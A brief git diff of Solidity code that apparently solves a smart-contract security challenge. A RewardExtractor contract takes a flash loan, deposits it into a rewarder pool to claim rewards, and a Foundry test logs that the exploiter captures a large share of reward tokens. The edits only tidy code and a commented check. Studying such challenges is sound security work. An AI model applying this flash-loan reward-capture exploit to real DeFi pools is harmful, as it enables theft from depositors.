@@ -30,10 +30,8 @@ contract RewardExtractor{
         flashLoanerPool.flashLoan(_amount);
     } 
 
-
     function receiveFlashLoan(uint256 _amount) external  {
         require(msg.sender == address(flashLoanerPool));
-        //require(tx.origin == player);
 
         liquidityToken.approve(address(theRewarderPool), _amount);
         theRewarderPool.deposit(_amount);
@@ -155,7 +153,6 @@ contract TestCanTakeAllRewards is Test{
         console.log(rewardToken.totalSupply());
         console.log(rewardToken.balanceOf(exploiter)); //PROOF THAT THE EXPLOITER TAKES THE A LARGE PORTION OF THE REWARD TOKEN AFTER 5 DAYS
         assertEq(theRewarderPool.roundNumber(), 3);
-        console.log();
         vm.stopPrank(); 
      }
 }
